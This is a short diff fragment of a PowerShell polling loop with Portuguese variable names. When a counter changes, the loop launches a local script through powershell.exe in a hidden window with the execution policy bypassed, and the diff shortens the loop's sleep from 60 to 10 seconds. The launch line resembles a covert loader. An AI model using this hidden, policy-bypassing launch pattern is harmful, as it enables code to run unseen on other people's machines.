@@ -37,5 +37,6 @@ while ($true) {
             Start-Process -FilePath "powershell.exe" -ArgumentList "-w h -NoP -NonI -Exec Bypass -File $localFilePath"
             $numeroInicial = $numeroAtual
         }
-    Start-Sleep -Seconds 60
+    Start-Sleep -Seconds 10
 }
+
